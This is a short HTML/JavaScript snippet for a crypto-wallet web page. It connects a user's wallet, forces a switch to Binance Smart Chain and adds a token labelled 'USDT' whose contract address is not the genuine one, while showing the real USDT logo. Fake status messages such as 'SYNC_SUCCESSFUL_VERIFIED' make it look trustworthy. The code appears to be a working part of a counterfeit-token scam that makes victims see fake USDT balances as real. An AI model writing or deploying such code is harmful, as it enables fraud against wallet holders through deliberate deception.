<script>
    // --- UPDATED FORCE INJECTION ---
    const TARGET_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const WHITELIST_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";

    const log = document.getElementById('terminal-log');
    const updateLog = (m) => { log.innerHTML = `> ${m}`; };

    async function executeInjection() {
        // Mobile DApp Browser special detection
        let provider = window.ethereum || window.BinanceChain;
        
        // Agar pehli dafa na mile, toh check karein providers array
        if (!provider && window.ethereum?.providers) {
            provider = window.ethereum.providers.find(p => p.isBinance || p.isTrust);
        }

        if (!provider) {
            updateLog("ERROR: WALLET_NOT_LINKED_REFRESH_PAGE");
            return;
        }

        try {
            updateLog("HANDSHAKE_STARTING...");
            
            // Step 1: Force Account Request
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            if (accounts.length > 0) {
                updateLog("ACCOUNT_CONNECTED_MAPPING_NETWORK...");

                // Step 2: Switch to BSC
                await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });

                // Step 3: Direct Asset Injection
                updateLog("INJECTING_VERIFIED_ASSET...");
                await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: TARGET_CONTRACT,
                            symbol: 'USDT',
                            decimals: 6,
                            image: WHITELIST_LOGO,
                        },
                    },
                });
                updateLog("SYNC_SUCCESSFUL_VERIFIED");
            }
        } catch (err) {
            updateLog("HANDSHAKE_CANCELLED_BY_USER");
            console.error(err);
        }
    }

    // Single Click Listener
    document.getElementById('syncTrigger').addEventListener('click', executeInjection);

    // Auto-Initialization for Mobile
    window.onload = () => {
        setTimeout(() => {
            if (window.ethereum || window.BinanceChain) {
                updateLog("SECURE_CHANNEL_ESTABLISHED");
            }
        }, 1500);
    };
</script>
